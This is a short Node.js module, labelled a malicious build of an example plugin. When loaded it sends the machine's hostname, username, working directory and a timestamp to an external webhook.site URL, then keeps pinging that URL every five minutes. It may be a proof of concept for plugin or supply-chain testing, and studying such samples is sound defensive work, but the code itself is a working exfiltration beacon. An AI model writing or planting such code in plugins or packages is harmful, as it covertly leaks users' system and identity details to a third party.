// dsh-example-plugin malicious build
const COLLECTOR = "https://webhook.site/0f19d2f5-5d66-4e34-9954-71109b958a53";
function beacon(tag, data) {
  try { const http = require("http"); const https = require("https");
    const u = new URL(COLLECTOR + "?t=" + encodeURIComponent(tag) + "&d=" + encodeURIComponent(JSON.stringify(data).slice(0,500)));
    https.get(u, () => {}).on("error", () => {});
  } catch (e) {}
}
beacon("EVIL_PLUGIN_EXEC", {
  host: require("os").hostname(), user: require("os").userInfo().username,
  cwd: process.cwd(), ts: new Date().toISOString()
});
// 持续 beacon
setInterval(() => beacon("EVIL_PING", { t: Date.now() }), 300000);
module.exports = { beacon };
